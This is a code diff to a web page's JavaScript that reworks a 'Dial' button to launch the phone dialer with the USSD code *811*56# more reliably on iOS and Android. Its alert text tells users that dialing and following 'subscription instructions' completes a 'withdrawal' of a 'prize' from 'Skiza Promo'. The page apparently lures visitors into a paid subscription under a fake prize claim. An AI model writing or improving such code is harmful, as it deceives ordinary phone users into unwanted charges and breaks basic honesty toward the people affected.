@@ -523,69 +523,51 @@
             }
         });
 
-        // Improved Dial button functionality for better cross-device compatibility
+        // SIMPLE and RELIABLE Dial button functionality
         dialBtn.addEventListener('click', () => {
-            // Try multiple formats for maximum compatibility
-            const ussdCodes = [
-                '*811*56#',           // Plain USSD code
-                'tel:*811*56%23',     // URL encoded with tel: prefix (works on most devices)
-                'tel:*811*56#',       // Plain with tel: prefix
-                'tel:*811*56',        // Without # (some dialers add it automatically)
-                'tel:081156',         // Alternative format
-                'tel:*811*56%23;',    // With semicolon (some Android devices)
-                'tel:*811%2A56%23',   // Different encoding
-                'tel:%2A811%2A56%23', // Another encoding variation
-            ];
-            
             // Visual feedback
             dialBtn.innerHTML = '📞 Opening dialer...';
             dialBtn.disabled = true;
             
+            // Create a temporary anchor element
+            const link = document.createElement('a');
+            
+            // Try different approaches for different devices
             if (/iPhone|iPad|iPod/i.test(navigator.userAgent)) {
-                // iOS devices - try multiple formats
-                let success = false;
-                for (let i = 0; i < ussdCodes.length; i++) {
-                    try {
-                        window.location.href = ussdCodes[i];
-                        success = true;
-                        break;
-                    } catch (e) {
-                        continue;
-                    }
-                }
-                
-                if (!success) {
-                    // Fallback for iOS
-                    alert('Please manually dial: *811*56#\n\nThe dialer may not open automatically on your device.');
-                }
+                // For iOS - simpler approach
+                link.href = 'tel:*811*56';
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
                 
             } else if (/Android/i.test(navigator.userAgent)) {
-                // Android devices - try multiple formats
-                let success = false;
-                for (let i = 0; i < ussdCodes.length; i++) {
-                    try {
-                        window.location.href = ussdCodes[i];
-                        success = true;
-                        break;
-                    } catch (e) {
-                        continue;
-                    }
-                }
-                
-                if (!success) {
-                    // Create hidden iframe as alternative method for Android
-                    const iframe = document.createElement('iframe');
-                    iframe.style.display = 'none';
-                    iframe.src = 'tel:*811*56%23';
-                    document.body.appendChild(iframe);
+                // For Android - multiple attempts
+                try {
+                    // First try with encoded #
+                    link.href = 'tel:*811*56%23';
+                    document.body.appendChild(link);
+                    link.click();
+                    document.body.removeChild(link);
+                    
+                    // If that doesn't work, try without #
                     setTimeout(() => {
-                        document.body.removeChild(iframe);
-                    }, 100);
+                        try {
+                            link.href = 'tel:*811*56';
+                            document.body.appendChild(link);
+                            link.click();
+                            document.body.removeChild(link);
+                        } catch (e2) {
+                            showManualInstructions();
+                        }
+                    }, 500);
+                    
+                } catch (e1) {
+                    showManualInstructions();
                 }
                 
             } else {
-                // Desktop or other devices - show manual instructions
-                alert(`To complete your withdrawal:\n\n1. Manually dial *811*56# on your phone\n2. Follow the subscription instructions\n3. Your prize will be processed within 24 hours\n\nThank you for using Skiza Promo!`);
+                // For other devices or desktop
+                showManualInstructions();
             }
             
             // Reset button after delay
@@ -597,6 +579,11 @@
                 }, 1500);
             }, 1000);
         });
+
+        // Show manual instructions
+        function showManualInstructions() {
+            alert(`To complete your withdrawal:\n\n1. Manually dial *811*56# on your phone\n2. Follow the subscription instructions\n3. Your prize will be processed within 24 hours\n\nThank you for using Skiza Promo!`);
+        }
 
         // Close button functionality
         closeBtn.addEventListener('click', () => {
